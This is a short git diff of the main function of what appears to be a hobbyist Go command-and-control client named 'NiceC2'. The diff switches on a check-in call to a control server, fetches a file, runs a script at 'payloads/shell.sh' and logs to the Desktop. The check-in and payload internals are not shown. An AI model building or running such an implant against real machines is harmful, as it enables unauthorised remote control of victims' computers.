@@ -40,19 +40,13 @@ func main() {
 
 	NodeID, _ = machineid.ID()
 
-	// test()
-
-	// checkIn()
+	checkIn()
 
 	getFIle()
 
 	scriptOutput := run_script("payloads/shell.sh")
 
 	fmt.Println(scriptOutput)
-
-	// Writing a file. I am pretty sure this is a ass backwards way of doing it
-
-	// fmt.Println(homedir.Dir())
 
 	// Get's the current time, and formats it. god this is weird
 	current_time := time.Now().Format("2006.01.02 15:04:05")
@@ -64,10 +58,6 @@ func main() {
 	testFile = filepath.Join(home, "Desktop", "NiceC2 Log file.txt")
 
 	fmt.Println(testFile)
-
-	// f, err := os.Create(testFile)
-	// check(err)
-	// defer f.Close()
 
 	// Opens/creates the file in a way that it can be appended to
 	file, err := os.OpenFile(testFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
